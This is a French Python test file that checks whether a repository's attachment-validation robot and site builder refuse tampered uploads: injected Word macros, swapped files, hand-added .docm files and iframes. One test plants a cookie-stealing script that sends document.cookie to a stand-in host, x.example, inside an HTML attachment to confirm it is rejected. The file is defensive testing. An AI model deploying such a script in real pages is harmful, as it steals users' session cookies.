# -*- coding: utf-8 -*-
"""Essai du robot et du site avec pièces jointes, dans une COPIE du dépôt (le vrai dépôt n'est pas touché).
Lancer :  python3 -I outils-validation/tests/test_robot_pj.py"""
import base64, hashlib, json, os, shutil, subprocess, sys, tempfile

ICI = os.path.dirname(os.path.abspath(__file__))
RACINE = os.path.abspath(os.path.join(ICI, "..", ".."))
sys.path.insert(0, ICI)
import test_valider_depot_pj as V    # rejoue d'abord l'essai du skill
T = V.T
ECHECS = []


def verifier(nom, cond, detail=""):
    print(("  ok   " if cond else "  ECHEC ") + nom + ((" -> " + str(detail)[-500:]) if (detail and not cond) else ""))
    if not cond:
        ECHECS.append(nom)


def py(copie, *args):
    return subprocess.run([sys.executable] + list(args), cwd=copie, capture_output=True, text=True, encoding="utf-8")


def preparer(tmp, pjs):
    copie = os.path.join(tmp, "depot")
    shutil.copytree(RACINE, copie, ignore=shutil.ignore_patterns(".git", "site", "__pycache__", "node_modules"))
    shutil.rmtree(os.path.join(copie, "validations"), ignore_errors=True)
    os.makedirs(os.path.join(copie, "validations"))
    d = V.depot(pjs)
    brut = os.path.join(tmp, "brut.json")
    json.dump(d, open(brut, "w", encoding="utf-8"), ensure_ascii=False)
    vide = os.path.join(tmp, "vide.json"); json.dump({}, open(vide, "w"))
    r = subprocess.run([sys.executable, "-I", os.path.join(copie, "outils-validation", "valider-depot", "scripts", "valider_depot.py"),
                        "finaliser", brut, vide, "--validateur", "Val", "--sortie", os.path.join(copie, "validations")],
                       capture_output=True, text=True, encoding="utf-8")
    return copie, r


with tempfile.TemporaryDirectory() as tmp:
    print("Robot : dépôt validé avec pièces jointes")
    docx, pdf = T.sain_docx(), T.sain_pdf()
    copie, r = preparer(tmp, [V.pj("note.docx", docx), V.pj("fiche.pdf", pdf)])
    verifier("fichier validé produit", r.returncode == 0, r.stdout + r.stderr)
    r = py(copie, "outils/integrer_validations.py")
    verifier("robot accepte", r.returncode == 0, r.stdout + r.stderr)
    proj = os.path.join(copie, "projets", "fiche-reflexe-de-synthese")
    verifier("projet créé", os.path.isdir(proj), r.stdout + r.stderr)
    pj = os.path.join(proj, "pieces-jointes")
    verifier("pièces jointes écrites", sorted(os.listdir(pj)) == ["fiche.pdf", "note.docx"] if os.path.isdir(pj) else False)
    verifier("fichiers identiques au validé", os.path.isdir(pj) and open(os.path.join(pj, "fiche.pdf"), "rb").read().startswith(b"%PDF-"))
    r = py(copie, "outils/valider.py")
    verifier("vérification du dépôt entier réussit", r.returncode == 0, r.stdout + r.stderr)
    r = py(copie, "outils/build.py")
    verifier("construction du site réussit", r.returncode == 0, r.stdout + r.stderr)
    verifier("page du projet liste les pièces jointes", os.path.exists(os.path.join(copie, "site", "projets", "fiche-reflexe-de-synthese.html")) and "Pièces jointes" in open(os.path.join(copie, "site", "projets", "fiche-reflexe-de-synthese.html"), encoding="utf-8").read())
    verifier("pièces jointes publiées", os.path.exists(os.path.join(copie, "site", "pieces-jointes", "fiche-reflexe-de-synthese", "note.docx")))

    print("Robot : fichier validé puis falsifié")
    with tempfile.TemporaryDirectory() as t2:
        copie, r = preparer(t2, [V.pj("note.docx", docx)])
        f = os.path.join(copie, "validations", "valide-fiche-reflexe-de-synthese.json")
        v = json.load(open(f, encoding="utf-8"))
        piege = T.modifier_zip(base64.b64decode(v["pieces_jointes"][0]["contenu_b64"]), {"word/vbaProject.bin": b"\x00"})
        v["pieces_jointes"][0]["contenu_b64"] = base64.b64encode(piege).decode()
        v["pieces_jointes"][0]["sha256"] = hashlib.sha256(piege).hexdigest()
        json.dump(v, open(f, "w", encoding="utf-8"), ensure_ascii=False)
        r = py(copie, "outils/integrer_validations.py")
        verifier("piège ajouté après validation : refusé", r.returncode == 1 and "macros" in (r.stdout + r.stderr), r.stdout + r.stderr)
        verifier("aucun projet créé", not os.path.exists(os.path.join(copie, "projets", "fiche-reflexe-de-synthese")))

    with tempfile.TemporaryDirectory() as t3:
        copie, r = preparer(t3, [V.pj("note.docx", docx)])
        f = os.path.join(copie, "validations", "valide-fiche-reflexe-de-synthese.json")
        v = json.load(open(f, encoding="utf-8"))
        autre = T.sain_docx("Autre document")
        v["pieces_jointes"][0]["contenu_b64"] = base64.b64encode(autre).decode()
        v["pieces_jointes"][0]["sha256"] = hashlib.sha256(autre).hexdigest()
        json.dump(v, open(f, "w", encoding="utf-8"), ensure_ascii=False)
        r = py(copie, "outils/integrer_validations.py")
        verifier("pièce remplacée par une autre saine : refusée (empreinte non validée)", r.returncode == 1 and "empreintes" in (r.stdout + r.stderr), r.stdout + r.stderr)

    with tempfile.TemporaryDirectory() as t4:
        copie, r = preparer(t4, [])
        r = py(copie, "outils/integrer_validations.py")
        verifier("sans pièce jointe : inchangé", r.returncode == 0, r.stdout + r.stderr)
        verifier("pas de dossier pieces-jointes", not os.path.exists(os.path.join(copie, "projets", "fiche-reflexe-de-synthese", "pieces-jointes")))

    with tempfile.TemporaryDirectory() as t5:
        copie, r = preparer(t5, [V.pj("note.docx", docx)])
        py(copie, "outils/integrer_validations.py")
        d = os.path.join(copie, "projets", "fiche-reflexe-de-synthese", "pieces-jointes")
        open(os.path.join(d, "intrus.docm"), "wb").write(b"x")
        r = py(copie, "outils/valider.py")
        verifier("pièce ajoutée à la main (.docm) : valider.py refuse", r.returncode == 1 and "docm" in (r.stdout + r.stderr), r.stdout + r.stderr)

    print("Robot : page HTML en pièce jointe")
    HTML = ("<!DOCTYPE html><html lang=\"fr\"><head><meta charset=\"utf-8\"><title>Outil</title></head>"
            "<body><p>Bonjour</p><script>document.body.dataset.x = '1';</script></body></html>").encode("utf-8")
    with tempfile.TemporaryDirectory() as t6:
        copie, r = preparer(t6, [V.pj("outil.html", HTML)])
        verifier("html : fichier validé produit", r.returncode == 0, r.stdout + r.stderr)
        r = py(copie, "outils/integrer_validations.py")
        verifier("html : robot accepte", r.returncode == 0, r.stdout + r.stderr)
        proj = os.path.join(copie, "projets", "fiche-reflexe-de-synthese")
        verifier("html : écrit dans pieces-jointes du projet", os.path.exists(os.path.join(proj, "pieces-jointes", "outil.html")))
        r = py(copie, "outils/valider.py")
        verifier("html : vérification du dépôt entier réussit", r.returncode == 0, r.stdout + r.stderr)
        r = py(copie, "outils/build.py")
        verifier("html : construction du site réussit", r.returncode == 0, r.stdout + r.stderr)
        pub = os.path.join(copie, "site", "pieces-jointes", "fiche-reflexe-de-synthese")
        verifier("html : publié uniquement en .zip", sorted(os.listdir(pub)) == ["outil.html.zip"] if os.path.isdir(pub) else False, os.listdir(pub) if os.path.isdir(pub) else "absent")
        import zipfile
        verifier("html : le .zip contient la page à l'identique", os.path.isdir(pub) and zipfile.ZipFile(os.path.join(pub, "outil.html.zip")).read("outil.html") == HTML)
        servis = [os.path.join(d, f) for d, _, fs in os.walk(os.path.join(copie, "site")) for f in fs if f.lower().endswith((".html", ".htm")) and "pieces-jointes" in d]
        verifier("html : aucune page HTML déposée n'est servie telle quelle", not servis, servis)
        page = open(os.path.join(copie, "site", "projets", "fiche-reflexe-de-synthese.html"), encoding="utf-8").read()
        verifier("html : la page du projet explique le .zip", "outil.html.zip" in page and "ne s'ouvrent jamais depuis ce site" in page)
        verifier("html : l'archive du projet contient la page", "fiche-reflexe-de-synthese/pieces-jointes/outil.html" in zipfile.ZipFile(os.path.join(copie, "site", "telechargements", "fiche-reflexe-de-synthese.zip")).namelist())

    with tempfile.TemporaryDirectory() as t7:
        copie, r = preparer(t7, [V.pj("outil.html", HTML)])
        f = os.path.join(copie, "validations", "valide-fiche-reflexe-de-synthese.json")
        v = json.load(open(f, encoding="utf-8"))
        piege = HTML.replace(b"</body>", b"<script>fetch('https://x.example/c?d='+document.cookie)</script></body>")
        v["pieces_jointes"][0]["contenu_b64"] = base64.b64encode(piege).decode()
        v["pieces_jointes"][0]["sha256"] = hashlib.sha256(piege).hexdigest()
        json.dump(v, open(f, "w", encoding="utf-8"), ensure_ascii=False)
        r = py(copie, "outils/integrer_validations.py")
        verifier("html piégé après validation : refusé", r.returncode == 1 and "fetch" in (r.stdout + r.stderr), r.stdout + r.stderr)
        verifier("html piégé : aucun projet créé", not os.path.exists(os.path.join(copie, "projets", "fiche-reflexe-de-synthese")))

    with tempfile.TemporaryDirectory() as t8:
        copie, r = preparer(t8, [V.pj("outil.html", HTML)])
        py(copie, "outils/integrer_validations.py")
        d = os.path.join(copie, "projets", "fiche-reflexe-de-synthese", "pieces-jointes")
        open(os.path.join(d, "outil.html"), "wb").write(HTML.replace(b"</body>", b"<iframe src=\"about:blank\"></iframe></body>"))
        r = py(copie, "outils/valider.py")
        verifier("html modifié à la main (iframe) : valider.py refuse", r.returncode == 1 and "iframe" in (r.stdout + r.stderr), r.stdout + r.stderr)

    print("Robot : texte long (500 000 caractères)")
    with tempfile.TemporaryDirectory() as t9:
        copie = os.path.join(t9, "depot")
        shutil.copytree(RACINE, copie, ignore=shutil.ignore_patterns(".git", "site", "__pycache__", "node_modules"))
        shutil.rmtree(os.path.join(copie, "validations"), ignore_errors=True); os.makedirs(os.path.join(copie, "validations"))
        d = V.depot([])
        ligne = "Synthétise les notes fournies en cinq points, sans rien inventer et en citant la source. "
        d["contenu"] = ("---\nname: synthese\ndescription: synthétise\n---\n" + (ligne + "\n") * 5000)[:500000]
        brut = os.path.join(t9, "brut.json"); json.dump(d, open(brut, "w", encoding="utf-8"), ensure_ascii=False)
        vide = os.path.join(t9, "vide.json"); json.dump({}, open(vide, "w"))
        r = subprocess.run([sys.executable, "-I", os.path.join(copie, "outils-validation", "valider-depot", "scripts", "valider_depot.py"),
                            "finaliser", brut, vide, "--validateur", "Val", "--sortie", os.path.join(copie, "validations")], capture_output=True, text=True, encoding="utf-8")
        verifier("500 000 caractères : validation (skill)", r.returncode == 0, r.stdout + r.stderr)
        r = py(copie, "outils/integrer_validations.py")
        verifier("500 000 caractères : robot accepte", r.returncode == 0, r.stdout + r.stderr)
        r = py(copie, "outils/valider.py")
        verifier("500 000 caractères : vérification du dépôt entier", r.returncode == 0, r.stdout + r.stderr)
        r = py(copie, "outils/build.py")
        verifier("500 000 caractères : construction du site", r.returncode == 0, r.stdout + r.stderr)

print()
if ECHECS:
    print("%d ECHEC(S) : %s" % (len(ECHECS), "; ".join(ECHECS))); sys.exit(1)
print("Tous les tests passent.")
